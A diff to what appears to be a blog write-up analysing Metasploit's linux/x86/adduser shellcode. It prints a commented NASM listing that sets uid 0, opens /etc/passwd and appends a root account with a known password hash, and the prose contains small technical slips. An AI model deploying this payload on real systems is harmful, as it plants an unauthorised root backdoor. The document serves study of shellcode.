@@ -199,56 +199,103 @@ unsigned char buf[] =
 "\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
 "\xcd\x80\x6a\x01\x58\xcd\x80";
 ```
-The shellcode disassembles to the following:
+
+Once the shellcode is disassembled (and commented, for discussion), the assembly looks like this:
 
 ```nasm
-00000000  31C9              xor ecx,ecx
-00000002  89CB              mov ebx,ecx
-00000004  6A46              push byte +0x46
-00000006  58                pop eax
-00000007  CD80              int 0x80
-00000009  6A05              push byte +0x5
-0000000B  58                pop eax
-0000000C  31C9              xor ecx,ecx
-0000000E  51                push ecx
-0000000F  6873737764        push dword 0x64777373
-00000014  682F2F7061        push dword 0x61702f2f
-00000019  682F657463        push dword 0x6374652f
-0000001E  89E3              mov ebx,esp
-00000020  41                inc ecx
-00000021  B504              mov ch,0x4
-00000023  CD80              int 0x80
-00000025  93                xchg eax,ebx
-00000026  E828000000        call 0x53
-0000002B  6D                insd
-0000002C  657461            gs jz 0x90
-0000002F  7370              jnc 0xa1
-00000031  6C                insb
-00000032  6F                outsd
-00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
-0000003B  736A              jnc 0xa7
-0000003D  3470              xor al,0x70
-0000003F  3449              xor al,0x49
-00000041  52                push edx
-00000042  633A              arpl [edx],di
-00000044  303A              xor [edx],bh
-00000046  303A              xor [edx],bh
-00000048  3A2F              cmp ch,[edi]
-0000004A  3A2F              cmp ch,[edi]
-0000004C  62696E            bound ebp,[ecx+0x6e]
-0000004F  2F                das
-00000050  7368              jnc 0xba
-00000052  0A598B            or bl,[ecx-0x75]
-00000055  51                push ecx
-00000056  FC                cld
-00000057  6A04              push byte +0x4
-00000059  58                pop eax
-0000005A  CD80              int 0x80
-0000005C  6A01              push byte +0x1
-0000005E  58                pop eax
-0000005F  CD80              int 0x80
+; adduser.nasm
+;  - Analyzed shellcode from metasploit
+;
+; > msfvenom -a x86 --platform linux -p linux/x86/adduser -f c
+
+global _start
+
+section .text
+_start:
+
+        ; int setreuid(uid_t ruid, uid_t euid)
+        ; eax = 0x46 (setreuid)
+        ; ebx = 0x0
+        ; ecx = 0x0
+
+        xor ecx,ecx
+        mov ebx,ecx
+        push byte +0x46
+        pop eax
+        int 0x80
+
+
+        ; int open(const char *pathname, int flags)
+        ; eax = 0x5 (open)
+        ; ebx = esp
+        ; ecx = 0x1
+        ; esp => |0x2f657463|0x2f2f7071|0x73737764|
+        ;            /etc       //pa       sswd
+
+        push byte +0x5
+        pop eax
+        xor ecx,ecx
+        push ecx
+        push dword 0x64777373   ; dwss
+        push dword 0x61702f2f   ; ap//
+        push dword 0x6374652f   ; cte/
+        mov ebx,esp
+        inc ecx
+        mov ch,0x4
+        int 0x80
+
+        xchg eax,ebx            ; save handle for write
+        call section_2          ; call pop
+
+section_1:
+
+        insd                    ; m     
+        gs jz 0x90              ; eta
+        jnc 0xa1                ; sp
+        insb                    ; l
+        outsd                   ; o
+        imul esi,[edx+edi+0x41],dword 0x49642f7a        ;it:Az/dI
+        jnc 0xa7                ; sj
+        xor al,0x70             ; 4p
+        xor al,0x49             ; 4I
+        push edx                ; R
+        arpl [edx],di           ; c:
+        xor [edx],bh            ; 0:
+        xor [edx],bh            ; 0:
+        cmp ch,[edi]            ; :/
+        cmp ch,[edi]            ; :/
+        bound ebp,[ecx+0x6e]    ; bin
+        das                     ; /
+        jnc 0xba                ; sh
+        db 0x0a                 ; \n
+
+section_2:
+
+        ; ssize_t write(int fd, const void *buf, size_t count)
+        ; eax = 0x4 (write)
+        ; ebx = file handle from open
+        ; ecx => metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\n
+        ; edx = 0x28 (40)
+
+        pop ecx                 ; save pointer to section_1
+        mov edx,[ecx-0x4]       ; interesting way set edx to 40
+        push byte +0x4
+        pop eax
+        int 0x80
+
+
+        ; void exit(int status)
+        ; eax = 0x1 (exit)
+        ; ebx = 0x0
+
+        push byte +0x1
+        pop eax
+        int 0x80
 ```
 
+The shellcode starts by calling the **setreuid** syscall, which is necessary for maintaining the permissions required to edit the "/etc/shadow" file.  This shellcode actually combines two common ways to reference a string in shellcode: the *call-pop* method (that we've seen already) and the *stack-push* method.  When calling the **open** syscall, the string "/etc//passwd" is pushed to the stack and referenced in the syscall.  Then we see a *call-pop* routine to save the string "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\n" for use in the **write** syscall.  After writing, the shellcode the exits cleanly.
+
+A little insight into the effort put in to shrinking shellcode is that, for this last adduser shellcode in the **write** syscall, they chose a `mov edx,[ecx-0x4]` (\x8b\x51\xfc) to put 40 into edx, instead of `xor edx,edx;mov dl,0x4` (\x31\xd2\xb2\x04).  That's quite a change for one byte - worth it.
 
 <br>
 {% include preamble.md %}
